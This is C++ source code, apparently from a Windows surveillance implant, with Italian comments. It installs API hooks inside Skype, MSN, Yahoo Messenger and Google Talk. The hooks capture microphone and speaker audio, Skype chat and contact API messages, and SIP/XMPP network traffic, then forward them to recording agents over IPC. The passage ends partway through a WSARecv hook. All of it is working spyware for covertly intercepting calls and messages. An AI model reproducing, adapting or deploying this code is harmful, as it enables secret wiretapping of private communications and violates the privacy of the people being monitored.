HRESULT GetWASAPICaptureFunction(BYTE **ret_ptr, DWORD func_num, DWORD *n_channels, DWORD *sampling) 
{
	BYTE *func_ptr;
	IMMDeviceEnumerator *pMMDeviceEnumerator;
	IMMDevice			*pMMDevice;
    HRESULT hr = S_OK;

	CoInitialize(NULL);

    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pMMDeviceEnumerator);
	if (FAILED(hr)) {
		CoUninitialize();
        return hr;
	}

	hr = pMMDeviceEnumerator->GetDefaultAudioEndpoint(eCapture, eCommunications, &pMMDevice);
	pMMDeviceEnumerator->Release();
	if (FAILED(hr)) {
		CoUninitialize();
        return hr;
	}

	func_ptr = GetWASAPICaptureFunctionAddress(pMMDevice, func_num, n_channels, sampling);
	pMMDevice->Release();
	CoUninitialize();

	if (func_ptr) {
		*ret_ptr = func_ptr;
		return S_OK;
	}

	return S_FALSE;
}

HRESULT __stdcall PM_WASAPICaptureGetBuffer(BYTE *class_ptr, 
											BYTE **ppData,
											UINT32 *pNumFramesToRead,
											DWORD *pdwFlags,
											UINT64 *pu64DevicePosition,
											UINT64 *pu64QPCPosition)
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(WASAPIGetBufferStruct)
	CALL_ORIGINAL_API(6);

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (ret_code!=S_OK || !Active || !(*Active))
		return ret_code;

	pData->obj_ptr = class_ptr;
	pData->audio_data = *ppData;
	
	return ret_code;
}

HRESULT __stdcall PM_WASAPICaptureGetBufferMSN(BYTE *class_ptr, 
											BYTE **ppData,
											UINT32 *pNumFramesToRead,
											DWORD *pdwFlags,
											UINT64 *pu64DevicePosition,
											UINT64 *pu64QPCPosition)
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(WASAPIGetBufferStruct)
	CALL_ORIGINAL_API(6);

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (ret_code!=S_OK || !Active || !(*Active))
		return ret_code;

	// E' una nuova chiamata
	if (pData->obj_ptr && pData->obj_ptr2 && pData->obj_ptr!=class_ptr && pData->obj_ptr2!=class_ptr) {
		pData->obj_ptr = NULL;
		pData->obj_ptr2 = NULL;
	}

	// Memorizza entrambi gli oggetti aperti da MSN
	if (pData->obj_ptr == NULL) {
		pData->obj_ptr = class_ptr;
		pData->audio_data = *ppData;
	} else if (pData->obj_ptr != class_ptr) {
		if (pData->obj_ptr2 == NULL) {
			pData->obj_ptr2 = class_ptr;
			pData->audio_data2 = *ppData;
		}
	}

	if (pData->obj_ptr == class_ptr)
		pData->audio_data = *ppData;

	if (pData->obj_ptr2 == class_ptr)
		pData->audio_data2 = *ppData;	

	return ret_code;
}

DWORD PM_WASAPICaptureGetBuffer_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (stricmp(proc_name, "skype.exe"))
			return 1; // Hooka solo skype.exe
	} else
		return 1;
	
	WASAPIGetBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	WASAPIGetBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	WASAPIGetBufferData.obj_ptr = NULL;
	WASAPIGetBufferData.audio_data = NULL;

	if (GetWASAPICaptureFunction(&(WASAPIGetBufferData.bAPIAdd), WASAPI_GETBUFFER, NULL, NULL) != S_OK)
		return 1;

	WASAPIGetBufferData.dwHookLen = 350;
	return 0;
}

DWORD PM_WASAPICaptureGetBufferMSN_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (stricmp(proc_name, "msnmsgr.exe") || !IsVista(NULL))
			return 1; // Hooka solo MSN
	} else
		return 1;
	
	WASAPIGetBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	WASAPIGetBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	WASAPIGetBufferData.obj_ptr = NULL;
	WASAPIGetBufferData.obj_ptr2 = NULL;
	WASAPIGetBufferData.audio_data = NULL;
	WASAPIGetBufferData.audio_data2 = NULL;

	if (GetWASAPICaptureFunction(&(WASAPIGetBufferData.bAPIAdd), WASAPI_GETBUFFER, NULL, NULL) != S_OK)
		return 1;

	WASAPIGetBufferData.dwHookLen = 550;
	return 0;
}

HRESULT __stdcall PM_WASAPICaptureReleaseBuffer(BYTE *class_ptr, 
												DWORD NumFramesWrittem)
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(WASAPIReleaseBufferStruct)
	
	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (Active && (*Active)) {
		// Solo se e' una Release sull'ultimo oggetto su cui ha fatto la GetBuffer
		if (pData->c_data->obj_ptr==class_ptr && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
			if (pData->sampling != 0) {
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling), 4, FLAGS_SAMPLING | FLAGS_INPUT, IPC_HI_PRIORITY);
				pData->sampling = 0;
			}
			LARGE_CLI_WRITE(pData->c_data->audio_data, NumFramesWrittem*SKYPE_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
			pData->c_data->obj_ptr = NULL;
		}
	}

	CALL_ORIGINAL_API(2);
	return ret_code;
}

HRESULT __stdcall PM_WASAPICaptureReleaseBufferMSN(BYTE *class_ptr, 
												DWORD NumFramesWrittem)
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(WASAPIReleaseBufferStruct)
	
	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (Active && (*Active)) {
		// Solo se e' una Release sull'ultimo oggetto su cui ha fatto la GetBuffer
		if (pData->c_data->obj_ptr2==class_ptr && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
			if (pData->sampling2 != NumFramesWrittem*100) {
				pData->sampling2 = NumFramesWrittem*100;
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling2), 4, FLAGS_SAMPLING | FLAGS_OUTPUT, IPC_HI_PRIORITY);
			}
			LARGE_CLI_WRITE(pData->c_data->audio_data2, NumFramesWrittem*MSN_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
		}

		if (pData->c_data->obj_ptr==class_ptr && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
			if (pData->sampling != NumFramesWrittem*100) {
				pData->sampling = NumFramesWrittem*100;
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling), 4, FLAGS_SAMPLING | FLAGS_INPUT, IPC_HI_PRIORITY);
			}
			LARGE_CLI_WRITE(pData->c_data->audio_data, NumFramesWrittem*MSN_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
		}
	}

	CALL_ORIGINAL_API(2);
	return ret_code;
}

DWORD PM_WASAPICaptureReleaseBuffer_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (stricmp(proc_name, "skype.exe"))
			return 1; // Hooka solo skype.exe
	} else
		return 1;
	
	WASAPIReleaseBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	WASAPIReleaseBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	WASAPIReleaseBufferData.c_data = (WASAPIGetBufferStruct *)pData->PARAM[0];
	WASAPIReleaseBufferData.prog_type = VOIP_SKWSA;

	if (GetWASAPICaptureFunction(&(WASAPIReleaseBufferData.bAPIAdd), WASAPI_RELEASEBUFFER, &(WASAPIReleaseBufferData.n_channels), &(WASAPIReleaseBufferData.sampling)) != S_OK)
		return 1;

	WASAPIReleaseBufferData.dwHookLen = 700;
	return 0;
}

DWORD PM_WASAPICaptureReleaseBufferMSN_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (stricmp(proc_name, "msnmsgr.exe") || !IsVista(NULL))
			return 1; // Hooka solo MSN
	} else
		return 1;
	
	WASAPIReleaseBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	WASAPIReleaseBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	WASAPIReleaseBufferData.c_data = (WASAPIGetBufferStruct *)pData->PARAM[0];
	WASAPIReleaseBufferData.prog_type = VOIP_MSNWS;
	WASAPIReleaseBufferData.sampling = NULL;
	WASAPIReleaseBufferData.sampling2 = NULL;

	if (GetWASAPICaptureFunction(&(WASAPIReleaseBufferData.bAPIAdd), WASAPI_RELEASEBUFFER, &(WASAPIReleaseBufferData.n_channels), NULL) != S_OK)
		return 1;

	WASAPIReleaseBufferData.dwHookLen = 700;
	return 0;
}

///////////////////////////
//
//   waveOutWrite
//
///////////////////////////
typedef struct {
	COMMONDATA;
	DWORD prog_type;
	waveOutGetID_t pwaveOutGetID;
} waveOutWriteStruct;

waveOutWriteStruct waveOutWriteData;

DWORD __stdcall PM_waveOutWrite(HWAVEOUT ARG1,
                                WAVEHDR *WaveHdr,
					  		    DWORD ARG3)
{
	UINT devID;
	BOOL *Active;
	DWORD channels = 1;

	MARK_HOOK

	INIT_WRAPPER(waveOutWriteStruct)
	CALL_ORIGINAL_API(3)

	// Se e' andato storto, ritorna
	if(!((DWORD)pData->pHM_IpcCliWrite) || ret_code!=MMSYSERR_NOERROR)
		return ret_code;

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (!Active || !(*Active))
		return ret_code;

	pData->pwaveOutGetID(ARG1, &devID);

	if (pData->prog_type == VOIP_SKYPE)
		channels = 2;

	// Non registra le scritture sul wave mapper
	if (devID!=0xFFFFFFFF) 
		// Invia tutto al dispatcher
		LARGE_CLI_WRITE((BYTE *)WaveHdr->lpData, WaveHdr->dwBufferLength, (channels<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);

	return ret_code;
}


DWORD PM_waveOutWrite_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE hMod;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++;
		if (stricmp(proc_name, "skype.exe") && 
			stricmp(proc_name, "yahoomessenger.exe") &&
			stricmp(proc_name, "googletalk.exe"))
			return 1; // Hooka solo skype, yahoo, gtalk
	} else
		return 1;

	if (!stricmp(proc_name, "skype.exe"))
		waveOutWriteData.prog_type = VOIP_SKYPE;
	else if (!stricmp(proc_name, "yahoomessenger.exe"))
		waveOutWriteData.prog_type = VOIP_YAHOO;
	else if (!stricmp(proc_name, "googletalk.exe"))
		waveOutWriteData.prog_type = VOIP_GTALK;
	else
		waveOutWriteData.prog_type = 0;

	VALIDPTR(hMod = LoadLibrary("winmm.DLL"))
	VALIDPTR(waveOutWriteData.pwaveOutGetID = (waveOutGetID_t) HM_SafeGetProcAddress(hMod, "waveOutGetID"))
	waveOutWriteData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	waveOutWriteData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;

	waveOutWriteData.dwHookLen = 750;
	return 0;
}


///////////////////////////
//
// waveInUnprepareHeader
//
///////////////////////////
typedef struct {
	COMMONDATA;
	DWORD prog_type;
	waveInGetID_t pwaveInGetID;
} waveInUnprepareHeaderStruct;

waveInUnprepareHeaderStruct waveInUnprepareHeaderData;

DWORD __stdcall PM_waveInUnprepareHeader(HWAVEOUT ARG1,
                                         WAVEHDR *WaveHdr,
					  		             DWORD ARG3)
{
	UINT devID;
	BOOL *Active;
	DWORD channels = 1;

	MARK_HOOK

	INIT_WRAPPER(waveInUnprepareHeaderStruct)
	CALL_ORIGINAL_API(3)

	// Se e' andato storto, ritorna
	if(!((DWORD)pData->pHM_IpcCliWrite) || ret_code!=MMSYSERR_NOERROR)
		return ret_code;

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (!Active || !(*Active))
		return ret_code;

	pData->pwaveInGetID(ARG1, &devID);

	if (pData->prog_type == VOIP_SKYPE)
		channels = 2;

	// Non registra le scritture sul wave mapper
	if (devID!=0xFFFFFFFF) 
		// Invia tutto al dispatcher
		LARGE_CLI_WRITE((BYTE *)WaveHdr->lpData, WaveHdr->dwBufferLength, (channels<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);

	return ret_code;
}


DWORD PM_waveInUnprepareHeader_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE hMod;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++;
		if (stricmp(proc_name, "skype.exe") && 
			stricmp(proc_name, "yahoomessenger.exe") &&
			stricmp(proc_name, "googletalk.exe"))
			return 1; // Hooka solo skype, yahoo, gtalk
	} else 
		return 1;

	if (!stricmp(proc_name, "skype.exe"))
		waveInUnprepareHeaderData.prog_type = VOIP_SKYPE;
	else if (!stricmp(proc_name, "yahoomessenger.exe"))
		waveInUnprepareHeaderData.prog_type = VOIP_YAHOO;
	else if (!stricmp(proc_name, "googletalk.exe"))
		waveInUnprepareHeaderData.prog_type = VOIP_GTALK;
	else
		waveInUnprepareHeaderData.prog_type = 0;

	VALIDPTR(hMod = LoadLibrary("winmm.DLL"))
	VALIDPTR(waveInUnprepareHeaderData.pwaveInGetID = (waveInGetID_t) HM_SafeGetProcAddress(hMod, "waveInGetID"))
	waveInUnprepareHeaderData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	waveInUnprepareHeaderData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	
	waveInUnprepareHeaderData.dwHookLen = 750;
	return 0;
}


///////////////////////////
//
//   SendMessageTimeOut
//
///////////////////////////
// Server per Skype
typedef struct {
	COMMONDATA;
	BOOL voip_is_sent;
	HWND voip_skapi_wnd;
	HWND voip_skapi_swd;

	BOOL im_is_sent;
	HWND im_skapi_wnd;
	HWND im_skapi_swd;

	BOOL cn_is_sent;
	HWND cn_skapi_wnd;
	HWND cn_skapi_swd;

	BOOL is_skypepm;
	BOOL is_spm_installed;
	UINT attach_msg;
} SendMessageStruct;
SendMessageStruct SendMessageData;

LRESULT __stdcall PM_SendMessage(  HWND hWnd,
								   UINT Msg,
								   WPARAM wParam,
								   LPARAM lParam,
								   UINT fuFlags,
								   UINT uTimeout,
								   PDWORD_PTR lpdwResult)
{
	BOOL *Active_VOIP, *Active_IM, *Active_Contacts;
	BYTE *msg_body;
	COPYDATASTRUCT *cdata;

	MARK_HOOK
	INIT_WRAPPER(SendMessageStruct)
	CALL_ORIGINAL_API(7)

	// Controlla se il monitor e' attivo
	Active_VOIP = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	Active_IM = (BOOL *)pData->pHM_IpcCliRead(PM_IMAGENT_SKYPE);
	Active_Contacts = (BOOL *)pData->pHM_IpcCliRead(PM_CONTACTSAGENT);
	if (!Active_VOIP || !Active_IM || !Active_Contacts)
		return ret_code;

	// Se sono disabilitati entrambi esce
	if (!(*Active_VOIP) && !(*Active_IM) && !(*Active_Contacts))
		return ret_code;

	if (!pData->pHM_IpcCliWrite) 
		return ret_code;

	// Skype ha dato l'ok per l'attach. Notifico i processi per poter mandare i messaggi delle api 
	if (!pData->is_spm_installed && !pData->is_skypepm && Msg==pData->attach_msg && wParam!=NULL) {
		if ((*Active_VOIP)) {
			if (pData->voip_skapi_swd != hWnd  || pData->voip_skapi_wnd != (HWND)wParam) {
				pData->voip_skapi_swd = hWnd;
				pData->voip_skapi_wnd = (HWND)wParam;
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&pData->voip_skapi_wnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&pData->voip_skapi_swd), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
			}
		}
		if ((*Active_IM)) {
			if (pData->im_skapi_swd != hWnd  || pData->im_skapi_wnd != (HWND)wParam) {
				pData->im_skapi_swd = hWnd;
				pData->im_skapi_wnd = (HWND)wParam;
				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&pData->im_skapi_wnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&pData->im_skapi_swd), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
			}
		}
		if ((*Active_Contacts)) {
			if (pData->cn_skapi_swd != hWnd  || pData->cn_skapi_wnd != (HWND)wParam) {
				pData->cn_skapi_swd = hWnd;
				pData->cn_skapi_wnd = (HWND)wParam;
				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&pData->cn_skapi_wnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&pData->cn_skapi_swd), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
			}
		}
	}
	
	if (Msg != WM_COPYDATA)
		return ret_code;
	cdata = (COPYDATASTRUCT *)lParam;
	msg_body = (BYTE *)cdata->lpData;

	if (pData->is_skypepm) {
		if ((*Active_VOIP)) {
			if (pData->voip_skapi_wnd != hWnd  || pData->voip_skapi_swd != (HWND)wParam) {
				pData->voip_skapi_wnd = hWnd;
				pData->voip_skapi_swd = (HWND)wParam;
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&hWnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&wParam), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
			}
		}
		if ((*Active_IM)) {
			if (pData->im_skapi_wnd != hWnd  || pData->im_skapi_swd != (HWND)wParam) {
				pData->im_skapi_wnd = hWnd;
				pData->im_skapi_swd = (HWND)wParam;
				// Usa la dispatch del tag utilizzato per start/stop dell'agente
				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&hWnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&wParam), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
			}
		}
		if ((*Active_Contacts)) {
			if (pData->cn_skapi_wnd != hWnd  || pData->cn_skapi_swd != (HWND)wParam) {
				pData->cn_skapi_wnd = hWnd;
				pData->cn_skapi_swd = (HWND)wParam;
				// Usa la dispatch del tag utilizzato per start/stop dell'agente
				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&hWnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&wParam), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
			}
		}
	} else { // siamo dentro Skype
		if ((*Active_VOIP)) {
			if (!pData->voip_is_sent) {
				pData->voip_is_sent = TRUE;
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_INI, IPC_HI_PRIORITY);
			}
		}
		if ((*Active_IM)) {
			if (!pData->im_is_sent) {
				pData->im_is_sent = TRUE;
				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_INI, IPC_HI_PRIORITY);
			}
		}

		if (cdata->cbData <= 4)
			return ret_code;

		// Scremiamo i messaggi che sicuramente non ci servono
		// CALL , #1411...  ci servono
		if ((*Active_VOIP)) {
			if ( (msg_body[0]=='C' && msg_body[1]=='A' && msg_body[2]=='L' && msg_body[3]=='L')  ||
				 (msg_body[1]=='1' && msg_body[2]=='4' && msg_body[3]=='1' && msg_body[4]=='1'))
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)cdata->lpData, cdata->cbData, FLAGS_SKAPI_MSG, IPC_HI_PRIORITY);
		}

		if ((*Active_IM)) {
			if ( (msg_body[0]=='C' && msg_body[1]=='H' && msg_body[2]=='A' && msg_body[3]=='T')  ||
				 (msg_body[0]=='M' && msg_body[1]=='E' && msg_body[2]=='S' && msg_body[3]=='S')  ||
				 (msg_body[1]=='I' && msg_body[2]=='M' && msg_body[3]=='A' && msg_body[4]=='G'))
				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)cdata->lpData, cdata->cbData, FLAGS_SKAPI_MSG, IPC_HI_PRIORITY);
		}

		if ((*Active_Contacts)) {
			DWORD data_len;
			data_len = cdata->cbData;
			// Se eccedesse, il messaggio non verrebbe mandato proprio
			if (data_len > MAX_MSG_LEN)
				data_len = MAX_MSG_LEN;
			if ( (msg_body[0]=='A' && msg_body[1]=='U' && msg_body[4]=='_' && msg_body[5]=='C') ||
				 (msg_body[0]=='C' && msg_body[1]=='U' && msg_body[2]=='R' && msg_body[3]=='R'))
				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)cdata->lpData, data_len, FLAGS_SKAPI_MSG, IPC_HI_PRIORITY);
		}

	}
	return ret_code;
}


DWORD PM_SendMessage_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo skype
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++;
		SendMessageData.is_skypepm = FALSE;
		if (!stricmp(proc_name, "skypepm.exe")) {
			SendMessageData.is_skypepm = TRUE; // siamo in skypepm
		} else if (stricmp(proc_name, "skype.exe")) 
			return 1; // Se non siamo in skype  non mette l'hook sulla sendmessage
	} else
		return 1;

	if (IsSkypePMInstalled())
		SendMessageData.is_spm_installed = TRUE;
	else
		SendMessageData.is_spm_installed = FALSE;

	SendMessageData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	SendMessageData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	SendMessageData.voip_is_sent = FALSE;
	SendMessageData.voip_skapi_wnd = 0;
	SendMessageData.voip_skapi_swd = 0;
	SendMessageData.im_is_sent = FALSE;
	SendMessageData.im_skapi_wnd = 0;
	SendMessageData.im_skapi_swd = 0;
	SendMessageData.cn_is_sent = FALSE;
	SendMessageData.cn_skapi_wnd = 0;
	SendMessageData.cn_skapi_swd = 0;
	SendMessageData.attach_msg = RegisterWindowMessage("SkypeControlAPIAttach");

	SendMessageData.dwHookLen = 2650;
	return 0;
}


///////////////////////////
//
//   Recv e Send
//
///////////////////////////
// Server per Yahoo Messenger
typedef struct {
	COMMONDATA;
} RecvStruct;
RecvStruct RecvData;

int __stdcall PM_Recv(SOCKET s,
					  char *buf,
					  int len,
					  int flags)
{
	BOOL *Active;
	DWORD msg_len;

	MARK_HOOK
	INIT_WRAPPER(RecvStruct)
	CALL_ORIGINAL_API(4)

	// Controlla il valore di ritorno
	if (!ret_code || ret_code==SOCKET_ERROR || buf==NULL)
		return ret_code;
	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (!Active || !(*Active))
		return ret_code;

	msg_len = ret_code;
	if (msg_len>15 && buf[0]=='S' && buf[1]=='I' && buf[2]=='P' && buf[3]=='/')
		// Il messaggio ricevuto sulla socket potrebbe essere piu' lungo di 1KB
		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_YMSG_IN, IPC_HI_PRIORITY);
	else if (msg_len>15 && buf[0]=='<' && buf[1]=='i' && buf[2]=='q' && buf[3]==' ')
		// Il messaggio ricevuto sulla socket potrebbe essere piu' lungo di 1KB
		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_GTALK_IN, IPC_HI_PRIORITY);
	
	return ret_code;
}

int __stdcall PM_Send(SOCKET s,
					  char *buf,
					  int len,
					  int flags)
{
	BOOL *Active;
	DWORD msg_len;

	MARK_HOOK
	INIT_WRAPPER(RecvStruct)
	CALL_ORIGINAL_API(4)

	// Controlla il valore di ritorno
	if (!ret_code || ret_code==SOCKET_ERROR || buf==NULL)
		return ret_code;
	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (!Active || !(*Active))
		return ret_code;

	msg_len = ret_code;
	if (msg_len>15 && buf[0]=='S' && buf[1]=='I' && buf[2]=='P' && buf[3]=='/')
		// Il messaggio ricevuto sulla socket potrebbe essere piu' lungo di 1KB
		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_YMSG_OUT, IPC_HI_PRIORITY);
	else if (msg_len>15 && buf[0]=='<' && buf[1]=='i' && buf[2]=='q' && buf[3]==' ')
		// Il messaggio ricevuto sulla socket potrebbe essere piu' lungo di 1KB
		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_GTALK_OUT, IPC_HI_PRIORITY);
	else if(msg_len > 7 && buf[0]=='U' && buf[1]=='U' && buf[2]=='N' && buf[3]==' ')
		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_MSN_OUT, IPC_HI_PRIORITY);

	return ret_code;
}

DWORD PM_Recv_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE hMod;

	// Verifica autonomamente se si tratta di un programma da hookare
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++;
		if (stricmp(proc_name, "YahooMessenger.exe") &&
			stricmp(proc_name, "Googletalk.exe") &&
			stricmp(proc_name, "msnmsgr.exe"))
			return 1; // Hooka solo YahooMessenger, GTalk e MSN
	} else{
		return 1;
	}

	RecvData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	RecvData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	RecvData.dwHookLen = 850;
	return 0;
}


///////////////////////////
//
//  WSARecv
//
///////////////////////////
// Server per Yahoo Messenger
typedef struct _WSABUF {
	ULONG len;     /* the length of the buffer */
	__field_bcount(len) CHAR FAR *buf; /* the pointer to the buffer */
} WSABUF, FAR * LPWSABUF;
typedef struct _OVERLAPPED *    LPWSAOVERLAPPED;
typedef void (WINAPI *LPWSAOVERLAPPED_COMPLETION_ROUTINE)(DWORD, DWORD, LPWSAOVERLAPPED, DWORD);
typedef struct {
	COMMONDATA;
} WSARecvStruct;
WSARecvStruct WSARecvData;

int FAR PASCAL PM_WSARecv(SOCKET s,
						LPWSABUF lpBuffers,
						DWORD dwBufferCount,
						LPDWORD lpNumberOfBytesRecvd,
						LPDWORD lpFlags,
						LPWSAOVERLAPPED lpOverlapped,
						LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
{
	BOOL *Active;
	char *buf;
	DWORD msg_len;

	MARK_HOOK
	INIT_WRAPPER(WSARecvStruct)
	CALL_ORIGINAL_API(7)

	// Controlla il valore di ritorno
	if (ret_code!=0)
		return ret_code;

	// Controlla se il monitor e' attivo
